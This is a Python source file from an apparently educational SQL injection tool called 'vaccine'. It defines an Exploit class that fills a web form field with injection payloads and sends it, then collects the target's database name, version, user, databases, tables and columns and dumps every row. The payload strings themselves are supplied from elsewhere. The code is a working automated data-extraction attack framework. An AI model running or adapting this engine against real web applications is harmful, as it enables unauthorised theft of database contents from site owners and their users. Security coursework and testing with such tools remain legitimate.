# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    __init__.py                                        :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: luzog78 <luzog78@gmail.com>                +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/12/15 23:10:41 by luzog78           #+#    #+#              #
#    Updated: 2026/01/16 16:44:59 by luzog78          ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

from typing import Any, Callable, Self

from vaccine import Database, Form, DBServer, InputField, Table, extract_unique_data, request, extract_data, print


class Exploit:
	def __init__(self,
			exploit_name: str,
			headers: dict[str, str],
			server: DBServer,
			ignored_databases: list[str],
			payloads: dict[str, str],
			delimiter: str,
			form: Form,
			input: InputField,
			verbose: bool,
			) -> None:
		self.exploit_name = exploit_name
		self.headers = headers
		self.server = server
		self.ignored_databases = ignored_databases
		self.payloads = payloads
		self.delimiter = delimiter
		self.form = form
		self.input = input
		self.verbose = verbose

		self.memory: dict[str, Any] = {}

	def format_payload(self, _payload: str, **kwargs: Any) -> str:
		injection_payload = _payload.replace('{delimiter}', f'{self.delimiter}')
		for key, value in kwargs.items():
			injection_payload = injection_payload.replace(f'{{{key}}}', f'{value}')
		return injection_payload
	
	def _fetch(self, injection_payload: str, limit: int = 999999999, offset: int = 0, **kwargs: Any) -> str:
		injection_payload = self.format_payload(
			injection_payload,
			limit=limit,
			offset=offset,
			**kwargs,
		)
		if self.verbose:
			print(f'ยง7ยงo> Fetch w/: {injection_payload}')
		response = request(
			method=self.form.method,
			url=self.form.action_url,
			headers=self.headers,
			data=self.form.get_inputs_dict() | {self.input.name: injection_payload},
		)
		return response.text

	def fetch(self, injection_payload: str, **kwargs: Any) -> tuple[list[str], bool]:
		injection_payload = self.format_payload(injection_payload, **kwargs)
		_data = injection_payload.split(self.delimiter)[1] if self.delimiter in injection_payload else ''

		def do_fetch(**kw: Any):
			return extract_data(
				self._fetch(
					injection_payload,
					**kw,
				),
				self.delimiter,
				data=_data,
			)

		data, success = do_fetch()
		if success and 'offset' not in kwargs:
			nb = len(data)
			total_nb = nb
			while nb == 1:
				more_data, success = do_fetch(limit=1, offset=total_nb)
				if not success:
					break
				nb = len(more_data)
				total_nb += nb
				data.extend(more_data)
		return data, not not data

	def fetch_unique(self, injection_payload: str, **kwargs: Any) -> str | None:
		injection_payload = self.format_payload(injection_payload)
		_data = injection_payload.split(self.delimiter)[1] if self.delimiter in injection_payload else ''
		return extract_unique_data(
			self._fetch(injection_payload, **kwargs),
			self.delimiter,
			data=_data,
		)

	def do_exploit(self,
			database_exploit_func: Callable[[Self, str], Database | None],
			version_exploit_func: Callable[[Self, str], str | None],
			user_exploit_func: Callable[[Self, str], str | None],
			databases_exploit_func: Callable[[Self, str], list[Database] | None],
			tables_exploit_func: Callable[[Self, str, Database], list[Table] | None],
			columns_exploit_func: Callable[[Self, str, Database, Table], list[str] | None],
			rows_exploit_func: Callable[[Self, str, Database, Table, str, int], list[str] | None],
			) -> bool:
		print(f'  [*] Starting {self.exploit_name} exploit on input {repr(self.input.name)} (type: {repr(self.input.type)})')

		# Database name
		current_database = database_exploit_func(self, self.payloads['database'])
		if current_database is None:
			return False

		# Version
		version = version_exploit_func(self, self.payloads['version'])
		if version is None:
			return False

		# User
		user = user_exploit_func(self, self.payloads['user'])

		# Databases
		databases = databases_exploit_func(self, self.payloads['databases'])
		if databases is None:
			databases = []

		if all(d.name.lower() != current_database.name.lower() for d in databases):
			databases.insert(0, current_database)
		
		if not databases:
			print('    [!] No databases found to exploit')
			return False

		for database in databases:
			if database.name in self.ignored_databases:
				print(f'    [-] Ignoring database {repr(database.name)}')
				continue

			print(f'    [*] Working on database {repr(database.name)}')
			# Tables
			tables = tables_exploit_func(self, self.payloads['tables'], database)
			if tables is None:
				continue

			for table in tables:
				# Columns
				columns = columns_exploit_func(self, self.payloads['columns'], database, table)
				if columns is None:
					continue

				for column_idx, column in enumerate(columns):
					# Rows
					rows = rows_exploit_func(self, self.payloads['dump'], database, table, column, column_idx)
					if rows is None:
						break
		return True
